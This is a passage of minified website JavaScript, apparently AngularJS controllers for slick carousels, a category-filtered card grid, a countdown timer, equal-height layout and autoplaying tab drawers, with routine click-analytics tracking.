$inject(){return["$rootScope","$element","$scope","$compile","$window"]}constructor(t,e,i,r,n){this.el=e[0],this.$element=e,this.$window=n,this.initialized=!1,this.gallery=null,this.slick=null,this.index=0,this.jQuery=window.jQuery,this.$scope=i,this.$compile=r,this.$rootScope=t,this.options=null,this.id=null,this.autoplay=null,this.inview=!1,this.inviewInit=!1,this.paused=!1,this.inviewImages=!1,this.READY_CLASS=te.mqnCssName("mqn2-carousel-ready"),this.PAUSE_CLASS=te.mqnCssName("mqn2-carousel-paused"),this.deepLinked=!1,this.INVIEW_POSITION_EVENT_CLASS=te.mqnCssName("mqn2-carousel-inview-position-event"),this.INVIEW_EVENT_CLASS=te.mqnCssName("mqn2-carousel-inview-event"),this.slidesData=null,this.timer=null,this.elapsedTime=null,this.keyboardNavigationWatcher=new YS,i.$on("$destroy",(()=>{this.dispose_()}))}preInit_(){}init(t){this.preInit_&&this.preInit_();let e=document.getElementById(t.galleryRootId);if(!this.el)return;e||(e=this.el.querySelector(["[mqn-slick-gallery]"])),this.waitForEvent=t.waitForEvent,this.delayStartDuration=t.delayStartDuration||0,this.delayStartOnlyDesktop=t.delayStartOnlyDesktop,this.restartOnOutView=t.restartOnOutView||!0,this.removeSlickAria=t.removeSlickAria,this.index=0,this.options=t,this.id=this.options.id,this.autoplay=t.autoplay,this.gallery=this.jQuery(e),this.slidesData=t.slides||!1;let i=this.jQuery(this.el).closest(`.${te.mqnCssName("mqn2-frame")}`),r=null;if(i&&(r=i.attr("id")),r){let t=new URL(window.location.href).searchParams.get(r);t&&(this.deepLinked=!0,this.index=parseInt(t-1),this.autoplay=!1,this.$window.onload=()=>{let t=this.jQuery(`#${r}`).offset(),e=0;if(t){e=parseInt(t.top);let i=document.querySelector("[pdp-bar]");i&&(e-=i.offsetHeight)}window.setTimeout((()=>{this.jQuery("html, body").scrollTop(e)}))})}window.setTimeout((()=>this.createSlick_())),this.options.isInModal&&this.$scope.$on("MQN2_MODAL_INIT",(()=>{window.setTimeout((()=>{this.slick.reinit(),this.$scope.$$phase||this.$scope.$apply()}))})),this.keyboardNavigationWatcher.on(Ip.KEYBOARD,(()=>{this.autoplay&&this.pause(this.index),this.autoplay=!1}))}getSetupDelayStartDuration_(){let t=this.delayStartDuration||0;return this.delayStartOnlyDesktop&&!rt.IS_DESKTOP()&&(t=0),t}pause(t){if(Op.is.defined(t)&&+t!=+this.index||this.paused)return;this.clearNextTimer();let e=new Date;this.timer&&(this.elapsedTime+=e.getTime()-this.timer.getTime()),this.paused=!0,this.gallery.slick("slickPause"),this.el.classList.add(this.PAUSE_CLASS)}unpause(t){if(Op.is.defined(t)&&+t!=+this.index||!this.paused)return;this.paused=!1,this.timer=new Date,this.clearNextTimer();let e=this.slick.options.autoplaySpeed-this.elapsedTime;this.runNext(e),this.el.classList.remove(this.PAUSE_CLASS)}runNext(t){this.clearNextTimer(),this.autoplay&&(t||(t=+this.options.autoplaySpeed),this.nextTimeout=window.setTimeout((()=>{this.gallery.slick("slickNext")}),t))}clearNextTimer(){window.clearTimeout(this.nextTimeout)}start(t){this.deepLinked?this.gallery.slick("slickGoTo",this.index):(this.gallery.slick("slickGoTo",0,!0),window.setTimeout((()=>{this.el.classList.add(this.INVIEW_POSITION_EVENT_CLASS),this.index=0,this.$scope.$apply(),this.paused=!1,this.elapsedTime=0,this.timer=new Date,this.gallery.slick("slickGoTo",this.index),this.autoplay&&this.runNext()}),t))}setupInview_(){let t=this.getSetupDelayStartDuration_();this.gallery.slick("slickPause",this.index),this.el.classList.remove(this.INVIEW_POSITION_EVENT_CLASS),this.el.classList.remove(this.INVIEW_EVENT_CLASS),this.waitForEvent&&this.$scope.$on("mqn-inview-in",((t,e)=>{e.inview&&this.waitForEvent?this.start(0):(this.gallery.slick("slickPause",this.index),this.clearNextTimer(),this.el.classList.remove(this.INVIEW_POSITION_EVENT_CLASS)),window.setTimeout((()=>{this.$scope.$apply()})),!this.inviewInit&&e.inview&&(this.trackCarouselAnalyticsEvent(this.index),this.inviewInit=!0)})),this.inviewDipose=Et.elementInViewWatcherFirstChangeOnly(this.el,{threshold:0},((e,i,r)=>{if(this.inview=i.isIntersecting,(!this.inview||t)&&!this.deepLinked&&(this.gallery.slick("slickGoTo",0),this.gallery.slick("slickPause",0),this.clearNextTimer(),this.waitForEvent&&this.el.classList.remove(this.INVIEW_POSITION_EVENT_CLASS),!this.waitForEvent&&this.el.classList.remove(this.INVIEW_EVENT_CLASS),this.index=0,window.setTimeout((()=>{this.stopVideos_()}))),this.inview){let t=this.slick.$slides[this.index];this.playVideoInSlide_(t)}this.inview&&!this.waitForEvent&&(this.el.classList.add(this.INVIEW_EVENT_CLASS),this.start(t)),window.setTimeout((()=>{this.$scope.$apply()})),!this.inviewInit&&this.inview&&(this.trackCarouselAnalyticsEvent(this.index),this.inviewInit=!0),this.$rootScope.$broadcast("MQN_SLICK_INVIEW",{id:this.id,ctrl:this,inview:this.inview})})).done,this.inviewImagesDipose=Et.elementInViewWatcherFirstChangeOnly(this.el,{threshold:0,rootMargin:"0px 0px 300% 0px"},((t,e,i)=>{this.inviewImages=e.isIntersecting,e.isIntersecting&&i(),this.$scope.$apply()})).done}createSlick_(){this.initialized||(this.timer=new Date,this.gallery.on("init",((t,e,i)=>{this.stopVideos_(),window.setTimeout((()=>{this.slick=e,this.initialized=!0,this.deepLinked||(this.index=e.currentSlide),this.slideCount=e.slideCount,this.updateSlideData_(),this.recompileClonedSlides_(),this.setupInview_(),this.elapsedTime=0,this.timer=new Date,this.gallery.slick("slickPause");let t=e.$slides[this.index];this.stopVideos_(t),this.$scope.$apply(),this.$rootScope.$broadcast("MQN_SLICK_INITIALIZED",{id:this.id,ctrl:this})}))})),this.gallery.on("beforeChange",((t,e,i)=>{window.setTimeout((()=>{this.clearNextTimer(),this.slick=e,this.index=e.currentSlide;let t=e.$slides[this.index];this.trackCarouselAnalyticsEvent(this.index),this.updateSlideData_(),this.playVideoInSlide_(t),this.elapsedTime=0,this.timer=new Date,t=e.$slides[this.index],this.stopVideos_(t),this.recompileClonedSlides_(),this.$scope.$apply(),this.fixSlickAccessibility(),this.$rootScope.$broadcast("MQN_SLICK_BEFORE_CHANGE",{id:this.id,ctrl:this})}))})),this.gallery.on("afterChange",((t,e)=>{this.autoplay&&!this.paused&&this.runNext(),!this.infinite&&this.isLast()&&(this.index=e.currentSlide,this.autoplay=!1,this.clearNextTimer(),this.gallery.slick("slickPause")),this.$rootScope.$broadcast("MQN_SLICK_AFTER_CHANGE",{id:this.id,ctrl:this})})),this.options.autoplay=!1,this.options.rows||(this.options.rows=0),window.setTimeout((()=>{this.gallery.not(".slick-initialized").slick(this.options),this.gallery.addClass(this.READY_CLASS),this.postCreateSlick_&&this.postCreateSlick_()}),100))}postCreateSlick_(){}updateSlideData_(){this.currentSlide=this.slidesData[this.index]}trackCarouselAnalyticsEvent(t){}playVideoInSlide_(t){this.options.no_video_control||[...t.querySelectorAll("video")].forEach((t=>{t.hasAttribute("mqn-video-slick-no-play")||(t.currentTime=0,this.isPlaying(t)||t.play().then((()=>{})).catch((t=>{})))}))}stopVideos_(t){if(this.options.no_video_control)return;let e=t?[...t.querySelectorAll("video")]:[];[...this.el.querySelectorAll("video")].forEach((t=>{e.includes(t)||t.hasAttribute("mqn-video-slick-no-stop")||window.setTimeout((()=>{t.currentTime=0,t.pause()}),100)}))}isPlaying(t){return!t.paused&&!t.ended&&t.readyState>2}recompileClonedSlides_(){this.cloned=[...this.el.querySelectorAll(".slick-cloned:not(.slick-cloned-lazycomplete)")],this.cloned.forEach((t=>{this.$compile(t)(this.$scope),t.classList.add("slick-cloned-lazyimagecomplete")}))}fixSlickAccessibility(){this.removeSlickAria&&Array.from(this.slick.$slides).forEach((t=>{t.setAttribute("aria-hidden",!1)}))}canLoadImages(){return this.inviewImages&&this.initialized}getCurrentSlideIndex(){if(this.galleryEl)return this.gallery.slick("slickCurrentSlide")}goToIndex(t,e="click",i=!1){if(+t!==this.index)return this.clearNextTimer(),this.gallery.hasClass("slick-initialized")&&(this.clearNextTimer(),this.gallery.slick("slickPause"),this.gallery.slick("slickGoTo",t),e&&this.triggerClickEvent(e),window.setTimeout((()=>this.$scope.$apply()))),!0}next(){this.gallery.hasClass("slick-initialized")&&(this.clearNextTimer(),this.gallery.slick("slickPause"),this.gallery.slick("slickNext"),this.triggerClickEvent("next"),window.setTimeout((()=>this.$scope.$apply())))}prev(){this.gallery.hasClass("slick-initialized")&&(this.clearNextTimer(),this.gallery.slick("slickPause"),this.gallery.slick("slickPrev"),this.triggerClickEvent("prev"),window.setTimeout((()=>this.$scope.$apply())))}triggerClickEvent(t="click"){let e=this.gallery.slick("slickCurrentSlide"),i=Pp.default.getClosestTrackingId(this.el),r=Tt.getClosestMqnFrame(this.el),n=r.getAttribute("mqn-autotrack-product"),s=r.getAttribute("mqn-autotrack-partial-type");("prev"!==t||"next"!==t)&&(t=t+"-"+e);let o={event:"module interaction",eventCategory:"module click",eventAction:i,eventLabel:t,pageName:window.location.pathname,product:n,moduleName:i,moduleType:s,nonInteraction:"0"};Pp.default.trackDataLayer(o)}isFirst(){if(!this.slick||this.slick.options.infinite)return!1;let t=this.gallery.slick("slickCurrentSlide"),e=this.slick.options.slidesToScroll||1;return e>1?0==Math.floor(t/e):0==t}isLast(){if(!this.slick||this.slick.options.infinite)return!1;let t=this.gallery.slick("slickCurrentSlide"),e=this.slick.options.slidesToScroll||1;if(e>1){return Math.floor(t/e)==Math.ceil(this.slick.slideCount/e)-1}return t==this.slick.slideCount-1}dispose_(){this.inviewDispose&&this.inviewDipose(),this.inviewImagesDispose&&this.inviewImagesDipose(),this.keyboardNavigationWatcher&&this.keyboardNavigationWatcher.dispose()}},Ao=XS,QS=class extends Ao{static get $inject(){return["$rootScope","$element","$scope","$compile"]}constructor(t,e,i,r){super(t,e,i,r),this.initialCategory="all",this.category="all",this.data={}}init(t,e,i){e&&(this.initialCategory=e),i&&(this.data=i),super.init(t)}setCategory(t){this.category=t;let e=this.options.slidesToShow||5,i=0;this.gallery.slick("slickUnfilter"),this.gallery.slick("slickGoTo",0,!0),this.gallery.slick("slickFilter",((r,n)=>{var s="all"===t||t===n.dataset.category;return this.removeInviewAttrs(n),s&&i<e&&(this.addInviewAttrs(n,i),i+=1),s}))}removeInviewAttrs(t){for(var e=[],i=t.attributes.length,r=0;r<i;r++){var n=t.attributes[r];n.name.startsWith("mqn-app-garden-inview")&&e.push(n.name)}e.forEach((e=>{t.removeAttribute(e)}))}addInviewAttrs(t,e){t.setAttribute("mqn-app-garden-inview",""),t.setAttribute("mqn-app-garden-inview-offset",e)}getCategoryCtaUrl(){let t=this.data.tabs,e="";for(let i=0;i<t.length;i++){let r=t[i];if(r.title===this.category){e=r.cta_url;break}}return e}postCreateSlick_(){this.setCategory(this.initialCategory)}},pu=QS,_r={SHOWMORE:te.mqnCssName("mqn2-app-garden__carousel-show-more"),SHOWMORE_OPEN:te.mqnCssName("mqn2-app-garden__carousel-show-more--open"),SHOWMORE_HIDDEN:te.mqnCssName("mqn2-app-garden__carousel-show-more--hidden"),CAROUSEL:te.mqnCssName("mqn2-app-garden__carousel--grid"),CAROUSEL_OPEN:te.mqnCssName("mqn2-app-garden__carousel--grid--open"),CARD_ACTIVE:te.mqnCssName("mqn2-app-garden__card--active")},sF=5,KS=class extends pu{static get $inject(){return["$rootScope","$element","$scope","$compile"]}constructor(t,e,i,r){super(t,e,i,r),this.el_=e[0]}setCategory(t){this.el_.querySelector("."+_r.SHOWMORE).classList.contains(_r.SHOWMORE_OPEN)?window.setTimeout((()=>{super.setCategory(t),this.showHideShowMoreButton(),this.$rootScope.$emit("mqnRunEqualSize")}),1e3):(super.setCategory(t),this.showHideShowMoreButton(),this.$rootScope.$emit("mqnRunEqualSize")),this.el_.querySelector("."+_r.SHOWMORE).classList.remove(_r.SHOWMORE_OPEN),this.el_.querySelector("."+_r.CAROUSEL).classList.remove(_r.CAROUSEL_OPEN)}showHideShowMoreButton(){window.setTimeout((()=>{document.querySelectorAll(`.${_r.CAROUSEL} .${_r.CARD_ACTIVE}`).length>sF?this.el_.querySelector("."+_r.SHOWMORE).classList.remove(_r.SHOWMORE_HIDDEN):this.el_.querySelector("."+_r.SHOWMORE).classList.add(_r.SHOWMORE_HIDDEN)}),100)}toggleShowMore(t){t.currentTarget.classList.contains(_r.SHOWMORE_OPEN)?(t.currentTarget.classList.remove(_r.SHOWMORE_OPEN),this.el_.querySelector("."+_r.CAROUSEL).classList.remove(_r.CAROUSEL_OPEN)):(t.currentTarget.classList.add(_r.SHOWMORE_OPEN),this.el_.querySelector("."+_r.CAROUSEL).classList.add(_r.CAROUSEL_OPEN))}},ZS=KS,Rp=ye(en()),JS=class{constructor(){}trackCarouselNavigationClick(t,e,i="click"){let r=Rp.default.getClosestTrackingId(t),n=Tt.getClosestMqnFrame(t),s=n.getAttribute("mqn-autotrack-product"),o=n.getAttribute("mqn-autotrack-partial-type");("prev"!==i||"next"!==i)&&(i=i+"-"+e);let a={event:"module interaction",eventCategory:"module click",eventAction:r,eventLabel:i,pageName:window.location.pathname,product:s,moduleName:r,moduleType:o,nonInteraction:"0"};Rp.default.trackDataLayer(a)}},Qa=new JS,Ts={READY_CLASS:te.mqnCssName("mqn2-carousel-ready"),PAUSE_CLASS:te.mqnCssName("mqn2-carousel-paused"),FIRST_SLIDE_CLASS:te.mqnCssName("mqn2-carousel-first-slide")},eA=class{static get $inject(){return["$rootScope","$element","$scope","$compile","$window"]}constructor(t,e,i,r,n){this.el=e[0],this.rl_=de.getDestroyableInstance(),this.$element=e,this.$window=n,this.initialized=!1,this.gallery=null,this.slick=null,this.index=0,this.jQuery=window.jQuery,this.$scope=i,this.$compile=r,this.$rootScope=t,this.options=null,this.id=null,this.inview=!1,this.paused=!1,this.inviewImages=!1,this.previousSlide=null,this.slidesData=null,i.$on("$destroy",(()=>this.dispose_()))}init(t){let e=document.getElementById(t.galleryRootId);!this.el||(this.el.classList.add(Ts.FIRST_SLIDE_CLASS),e||(e=this.el.querySelector(["[mqn-slick-gallery]"])),this.index=0,this.options=t,this.id=this.options.id,this.options.autoplay=!1,this.options.swipe=!1,this.options.rows=0,this.options.repeat=this.options.repeat,this.options.disablePause=this.options.disablePause,this.gallery=this.jQuery(e),this.paused=!0,this.slidesData=t.slides||!1,window.setTimeout((()=>this.createSlick_())))}stop(t){if(this.paused)return;this.clearNextTimer(),this.paused=!0,this.gallery.slick("slickPause"),this.rl_.mutate((()=>this.el.classList.add(Ts.PAUSE_CLASS)));let e=new Date;if(this.timer&&(this.elapsedTime+=e.getTime()-this.timer.getTime()),!t){let t=this.slick.$slides[this.index];this.pauseVideos(t)}}unpause(t){this.paused=!1,this.rl_.mutate((()=>this.el.classList.remove(Ts.PAUSE_CLASS))),t||[...this.slick.$slides[this.index].querySelectorAll("video")].forEach((t=>{this.isPlaying(t)||t.play().then((()=>{})).catch((t=>{}))})),this.timer=new Date,this.runNext(this.elapsedTime)}pauseVideos(t,e){[...t.querySelectorAll("video")].forEach((t=>{e&&(t.currentTime=0),t.pause()}))}playVideos(t,e){[...t.querySelectorAll("video")].forEach((t=>{e&&(t.currentTime=0),this.isPlaying(t)||t.play().then((()=>{})).catch((t=>{}))}))}resetVideos(t){[...t.querySelectorAll("video")].forEach((t=>{t.currentTime=0}))}start(){this.play(0),window.setTimeout((()=>{this.playVideos(this.slick.$slides[0],!0)}))}play(t=0,e,i){t>=this.slideCount&&(t=0),this.paused=!1,this.rl_.mutate((()=>this.el.classList.remove(Ts.PAUSE_CLASS))),this.updateActiveStyle_(),this.gallery.slick("slickGoTo",t,i),e||(this.elapsedTime=0,this.timer=new Date,this.runNext())}forcePlayVideos(t){let e=this.slick.$slides[t];this.playVideos(e,!0)}stopAtFirstVideoFrame(t,e){t>=this.slideCount&&(t=0),this.clearNextTimer(),this.play(t,!0,e);let i=this.slick.$slides[t];window.setTimeout((()=>{this.stop(),this.pauseVideos(i,!0)}))}runNext(t=0){this.clearNextTimer();let e=this.slidesData[this.index].duration||+this.options.autoplaySpeed,i=e-t;Array.from(this.el.querySelectorAll("[mqn-line]")).forEach((t=>{t.style.animationDuration=e+"ms"})),this.nextTimeout=window.setTimeout((()=>{this.options.repeat?this.play(this.index):this.play(this.index+1)}),i)}clearNextTimer(){window.clearTimeout(this.nextTimeout)}setupInview_(){this.gallery.slick("slickPause",this.index),this.inviewDipose=Et.elementInViewWatcherFirstChangeOnly(this.el,{threshold:0},((t,e,i)=>{this.inview=e.isIntersecting,this.inview||(this.play(0,!1,!0),this.stop(),this.updateIndex_(0),this.$scope.$apply()),this.$rootScope.$broadcast("MQN_SLICK_INVIEW",{id:this.id,ctrl:this,inview:this.inview,el:this.el})})).done,this.inviewImagesDipose=Et.elementInViewWatcherFirstChangeOnly(this.el,{threshold:0,rootMargin:"0px 0px 300% 0px"},((t,e,i)=>{this.inviewImages=e.isIntersecting,e.isIntersecting&&i(),this.$scope.$apply()})).done}createSlick_(){this.initialized||(this.gallery.on("init",this.slickInit.bind(this)),this.gallery.on("beforeChange",this.slickBeforeChange.bind(this)),this.gallery.on("afterChange",this.slickAfterChange.bind(this)),window.setTimeout((()=>{this.gallery.not(".slick-initialized").slick(this.options)}),100))}slickInit(t,e,i){window.setTimeout((()=>{this.slick=e,this.initialized=!0,this.updateIndex_(0),this.slideCount=e.slideCount,this.recompileClonedSlides_(),this.setupInview_(),this.gallery.slick("slickPause"),this.$scope.$apply(),this.rl_.mutate((()=>{this.el.classList.add(Ts.READY_CLASS),this.gallery.addClass(Ts.READY_CLASS)})),this.$rootScope.$broadcast("MQN_SLICK_INITIALIZED",{id:this.id,ctrl:this})}))}slickBeforeChange(t,e,i,r){this.slick=e,this.updateIndex_(r),this.recompileClonedSlides_(),this.previousSlide=this.slick.$slides[i];let n=this.slick.$slides[r];this.pauseVideos(this.previousSlide),this.pauseVideos(n),this.updateActiveStyle_(),window.setTimeout((()=>{this.$scope.$apply(),this.$rootScope.$broadcast("MQN_SLICK_BEFORE_CHANGE",{id:this.id,ctrl:this,currentSlide:i,nextSlide:r})}))}slickAfterChange(t,e,i){this.updateIndex_(e.currentSlide),this.resetVideos(this.previousSlide);let r=e.$slides[this.index];this.playVideos(r,!0),window.setTimeout((()=>{this.$scope.$apply(),this.$rootScope.$broadcast("MQN_SLICK_AFTER_CHANGE",{id:this.id,ctrl:this})}))}isPlaying(t){return!t.paused&&!t.ended&&t.readyState>2}updateActiveStyle_(){let t=this.slick.$slides[this.index];this.rl_.mutate((()=>{this.el.classList.remove(Ts.FIRST_SLIDE_CLASS);let e=Array.from(this.el.querySelectorAll("[mqn-tab]"));[...Array.from(this.slick.$slides),...e].forEach((t=>{t.classList.remove("active"),t.classList.remove("tab-active")})),this.rl_.mutate((()=>t.classList.add("active"))),window.setTimeout((()=>{t.classList.add("tab-active");let e=this.el.querySelector(`[mqn-tab-${this.index}]`);e&&e.classList.add("tab-active")}),1)}))}updateIndex_(t){this.index=t;let e=this.slidesData[t];this.currentSlide=e,this.rl_.mutate((()=>this.el.setAttribute("carousel-index",this.index)))}recompileClonedSlides_(){Array.from(this.el.querySelectorAll(".slick-cloned:not(.slick-cloned-lazycomplete)")).forEach((t=>{this.$compile(t)(this.$scope),t.classList.add("slick-cloned-lazyimagecomplete")}))}getCurrentSlideIndex(){return this.index}handleMouseOut(t){this.preventMouseEvent||this.disablePause||this.index==t&&this.unpause(!0)}handleMouseMove(t){this.preventMouseEvent||this.disablePause||(this.debounceMouseOver--,!(this.debounceMouseOver&&this.debounceMouseOver>0)&&this.index==t&&this.stop(!0))}handleClick(t){this.index==t||this.preventMouseEvent||(Qa.trackCarouselNavigationClick(this.el,t),this.preventMouseEvent=!0,this.play(t),window.setTimeout((()=>{this.preventMouseEvent=!1,this.debounceMouseOver=10}),500))}goToNext(){this.play(this.index+1)}goToPrev(){this.play(this.index-1)}canLoadImages(){return this.inviewImages&&this.initialized}dispose_(){this.inviewDispose&&this.inviewDipose(),this.inviewImagesDispose&&this.inviewImagesDipose(),this.rl_.destroy()}},tA=eA,Co={DAY:86400,HOUR:3600,MINUTE:60,SECOND:1},Mp=class{static get $inject(){return["$element","$scope"]}constructor(t,e){this.element=t[0],this.$scope=e,this.time=0,this.days=0,this.hours=0,this.minutes=0,this.seconds=0,this.ready=!1,this.complete=!1,this.interval_=null,this.timestampOffset_=0,e.$on("$destroy",(()=>this.dispose()))}init(t){this.time=t.time;let e=this.getDebugTimestamp_();e>0&&(this.timestampOffset_=this.divideIntegers((new Date).getTime(),1e3)-e),this.tick(),this.start()}start(){this.interval_=window.setInterval((()=>this.tick()),1e3)}stop(){this.interval_&&(window.clearInterval(this.interval_),this.interval_=null)}tick(){let t=this.time-this.getTimestamp();t<0&&(t=0,this.complete=!0,this.stop()),this.days=this.divideIntegers(t,Co.DAY),t-=this.days*Co.DAY,this.hours=this.divideIntegers(t,Co.HOUR),t-=this.hours*Co.HOUR,this.minutes=this.divideIntegers(t,Co.MINUTE),t-=this.minutes*Co.MINUTE,this.seconds=t,this.$scope.$$phase||this.$scope.$apply()}divideIntegers(t,e){return t/e>>0}pad(t,e){let i=t+"";return i.length>=e?i:"0".repeat(e-i.length)+t}getTimestamp(){return this.divideIntegers(1*new Date,1e3)-this.timestampOffset_}getDebugTimestamp_(){if(window.URLSearchParams&&window.location.search){let t=new window.URLSearchParams(window.location.search),e=1*t.get("debugCountdown");if(e)return e;let i=t.get("fcd");if(i&&16==i.length){let t=this.parseDateString_(i);return this.divideIntegers(t.getTime(),1e3)}}return 0}parseDateString_(t){let e=t.split(/[^0-9]/).map((t=>parseInt(t)));return new Date(e[0],e[1]-1,e[2],e[3],e[4])}dispose(){this.stop()}};function rA(t){return t.querySelector("[mqn-equal-height-variable]")||t}var $p=class{constructor(t,e,i,r){this.root=t,this.selector=e,this.elements=[],this.setToShortest=i,this.breakpoint=r,this.rl_=de.getDestroyableInstance()}forEachElement(t){this.elements.forEach((e=>t(e)))}run(){if(this.breakpoint){let t=this.breakpoint.startsWith(">"),e=+this.breakpoint.substring(1);if(t&&e>=window.innerWidth)return void this.removeEqualHeights();if(!t&&e<=window.innerWidth)return void this.removeEqualHeights()}document.querySelector(".mqn2-body").classList.contains("mqn2-body--isIOS-legacy")?this.removeEqualHeights():this.setToShortest?this.setToShortestElement():this.setToTallestElement()}setToTallestElement(){this.rl_.measure((()=>{if(this.elements=[...this.root.querySelectorAll(this.selector)],1==this.elements.length)return;let t=0;this.forEachElement((e=>{let i=rA(e);t=Math.max(i.offsetHeight,t)})),this.forEachElement((e=>{this.rl_.anyMutate((()=>{e.style.minHeight=t+"px"}))}))}))}setToShortestElement(){this.rl_.measure((()=>{if(this.elements=[...this.root.querySelectorAll(this.selector)],1==this.elements.length)return;let t=1e4;this.forEachElement((e=>{let i=rA(e);t=Math.min(i.offsetHeight,t)})),this.forEachElement((e=>{this.rl_.anyMutate((()=>{e.style.maxHeight=t+"px"}))}))}))}removeEqualHeights(){this.rl_.measure((()=>{this.elements=[...this.root.querySelectorAll(this.selector)],this.forEachElement((t=>{this.rl_.anyMutate((()=>{t.style.maxHeight="",t.style.minHeight=""}))}))}))}dispose(){this.elements=null,this.rl_.destroy()}},iA=$p,nA=class{static get $inject(){return["$rootScope","$element","$scope"]}constructor(t,e,i){this.el=e[0],this.$scope=i,this.$rootScope=t,this.equalizeInstances=[],this.windowResizeListener=null,this.windowInnerWidth=null,this.$rootScope.$on("mqnRunEqualSize",(()=>this.run(!0))),i.$on("$destroy",(()=>this.dispose_()))}setupResizing_(){this.resizeDebouncer=null;let t=t=>{window.clearTimeout(this.resizeDebouncer),this.resizeDebouncer=window.setTimeout((()=>this.run()),300)};window.MQN_RESIZER?(window.MQN_RESIZER.addListener(t),this.windowResizeListener=()=>{window.MQN_RESIZER&&window.MQN_RESIZER.removeListener(t)}):($window.addEventListener("resize",t,{passive:!0}),this.windowResizeListener=()=>$window.removeEventListener("resize",t))}init(t,e){this.postScanCssClass=e,window.setTimeout((()=>{t.forEach((t=>{let e=t,i=null,r=null;t instanceof Array&&(e=t[0],r=t[1],i=t[2],"mobile"===i?i="<"+rt.TABLET:"tablet"===i&&(i="<"+rt.DESKTOP));let n=new iA(this.el,e,r,i);this.equalizeInstances.push(n)})),this.run(),this.$scope.$emit("MQN2_EQUAL_HEIGHTS_INITIALIZED"),this.setupResizing_()}))}run(t=!1){if(this.windowInnerWidth===window.innerWidth&&!t)return;this.windowInnerWidth=window.innerWidth;let e="mqn-equal-height-ready";this.el.removeAttribute(e),this.el.classList.add("equal-height-calculating"),window.setTimeout((()=>{this.equalizeInstances.forEach((t=>t.run())),window.setTimeout((()=>{this.el.classList.remove("equal-height-calculating"),this.el.setAttribute(e,!0)}),30)}))}dispose_(){this.windowResizeListener&&this.windowResizeListener(),this.equalizeInstances.forEach((t=>t.dispose())),this.equalizeInstances=null}},sA=nA,AZ=Gc(),oA=class{static get $inject(){return["$rootScope","$element","$scope"]}constructor(t,e,i){this.$scope=i,this.$rootScope=t,this.el=e[0],this.data=null,this.inviewWatcher=null,this.inview=!1,this.toggleState=null,this.query="",i.$on("$destroy",(()=>{this.dispose_()}))}init(t,e){window.setTimeout((()=>{this.data=t,this.$scope.$apply(),window.setTimeout((()=>{this.$rootScope.$broadcast("MQN2_PARALLAX_CALCULATE"),this.$rootScope.$broadcast("MQN2_PARALLAX_UPDATE")}))}),1e3),this.inviewWatcher=Et.elementInViewWatcherFirstChangeOnly(this.el,{threshold:0,rootMargin:"0px 0px 300% 0px"},((t,e,i)=>{e.isIntersecting&&(this.inview=!0,this.$scope.$apply(),i())}))}clearQuery(){this.query=""}toggle(t){this.toggleState=this.toggleState==t?null:t,this.clearQuery(),window.setTimeout((()=>{this.$scope.$apply()}))}dispose_(){this.inviewWatcher&&this.inviewWatcher.done()}},aA=oA,lA=ye(Jt()),xo=ye(gt()),mu=ye(en()),To=(t,e="click",i)=>{let r=(0,mu.getClosestTrackingId)(t),n=Tt.getClosestMqnFrame(t);if(!n)return;let s=n.getAttribute("mqn-autotrack-product"),o=n.getAttribute("mqn-autotrack-partial-type");("prev"!==e||"next"!==e)&&(e=e+"-"+i);let a={event:"module interaction",eventCategory:"module click",eventAction:r,eventLabel:e,pageName:window.location.pathname,product:s,moduleName:r,moduleType:o,nonInteraction:"0"};(0,mu.trackDataLayer)(a)};function Lp(){return er}var oF=5e3,Dp={PAUSED:te.mqnCssName("mqn2-template-grid-drawers__sections--paused"),TAB_BUTTON:te.mqnCssName("mqn2-template-grid-drawers__tab__button")},kp=class{static get $inject(){return["$element","$scope"]}constructor(t,e){this.el=t[0],this.$scope=e,this.index=0,this.ev=lA.elementVisibility.inview(this.el,{}),this.rl_=de.getDestroyableInstance(),this.domWatcher_=new xo.DomWatcher,this.allFocusableElements_=new Set(Array.from(this.el.querySelectorAll("*"))),this.tabButtons_=Array.from(this.el.querySelectorAll(`.${Dp.TAB_BUTTON}`)),this.paused_=!1,this.runNextAutoplay=null,this.previousIndex=0,this.drawerMediaItems=Array.from(this.el.querySelectorAll("[drawer-media-item]")),this.autoplayDuration=oF,this.scheduleNext(),this.init_(),e.$on("$destroy",(()=>this.dispose_()))}init_(){this.domWatcher_.add({element:this.el,on:"mousedown",callback:()=>this.mouseDown_=!0}),this.domWatcher_.add({element:window,on:"mouseup",callback:()=>this.mouseDown_=!1}),this.tabButtons_.forEach((t=>{this.domWatcher_.add({element:t,on:"focus",callback:()=>{this.mouseDown_||this.pauseAutoplay()}})})),this.loop_()}loop_(){this.rl_.measure((()=>{this.rl_.cleanup((()=>this.loop_()));let t=window.getSelection();this.lastNode_!==t.focusNode&&(this.lastNode_=t.focusNode,!this.mouseDown_&&t.focusNode&&this.allFocusableElements_.has(t.focusNode.parentElement)?this.pauseAutoplay():this.resumeAutoplay())}))}pauseAutoplay(){window.clearTimeout(this.runNextAutoplay),this.rl_.mutate((()=>{this.paused_=!0,Fi(this.el,Dp.PAUSED)}))}resumeAutoplay(){this.rl_.mutate((()=>{this.paused_=!1,Ni(this.el,Dp.PAUSED),this.scheduleNext()}))}scheduleNext(){this.paused_||(this.runNextAutoplay=window.setTimeout((()=>{this.goTo(this.index+1,{isAutoplay:!0})}),this.autoplayDuration))}setAutoplayDuration(t){this.autoplayDuration=t}goTo(t,e){let i=e||{};window.clearTimeout(this.runNextAutoplay);let r=Lp().scrollTop,n=()=>{document.removeEventListener("scroll",n),Lp().scrollTop=r};document.addEventListener("scroll",n),this.previousIndex=this.index,this.index=xo.mathf.wrap(t,0,this.drawerMediaItems.length),xo.dom.playAllVideosInElement(this.drawerMediaItems[this.index]),i.isAutoplay||this.ev.state().inview&&To(this.el,"tab",this.index),this.scheduleNext(),this.$scope.$$phase||this.$scope.$apply()}dispose_(){this.ev.dispose()}},cA=class{static get $inject(){return["$rootScope","$element","$scope","$compile"]}constructor(t,e,i,r){this.initialized=!1,this.$element=e,this.element=e[0],this.$rootScope=t,this.content=this.element.querySelector("[mqn-modal-root-content]"),this.$compile=r,this.$scope=i;let n=window.pageYOffset||document.documentElement.scrollTop;this.preloadModalImmediateImages_(),0!=n||yr.turnOffLazyImage()?this.preloadModalImages_():window.addEventListener("scroll",(()=>{this.preloadModalImages_()}),{once:!0,passive:!0})}fireInit(t=500,e){window.setTimeout((()=>{this.$rootScope.$broadcast("MQN2_MODAL_INIT",e)}),t)}fireClose(t=500,e){window.setTimeout((()=>{this.$rootScope.$broadcast("MQN2_MODAL_CLOSE",e)}),t)}getImageUrl_(t){let 